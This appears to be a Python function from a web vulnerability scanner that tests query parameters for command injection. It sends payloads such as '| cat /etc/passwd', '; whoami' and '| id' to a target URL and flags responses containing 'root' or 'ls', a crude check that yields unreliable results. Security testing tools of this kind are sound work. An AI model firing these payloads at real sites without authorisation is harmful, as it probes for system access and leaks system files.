import requests

# Define command injection payloads
command_injection_payloads = [
    "; ls",
    "| cat /etc/passwd",
    "; whoami",
    "| id"
]

# Function to test for Command Injection vulnerabilities
def test_command_injection(url, input_fields):
    print(f"Testing for Command Injection on {url}")
    vulnerable_params = []
    for field in input_fields:
        name = field[2]
        for payload in command_injection_payloads:
            test_url = f"{url}?{name}={payload}"
            try:
                response = requests.get(test_url)
                if response.status_code == 200 and ("root" in response.text or "ls" in response.text):
                    print(f"Potential Command Injection vulnerability detected in parameter: {name} with payload: {payload}")
                    vulnerable_params.append((name, payload))
            except Exception as e:
                print(f"Error testing Command Injection on parameter: {name} - {e}")
    return vulnerable_params
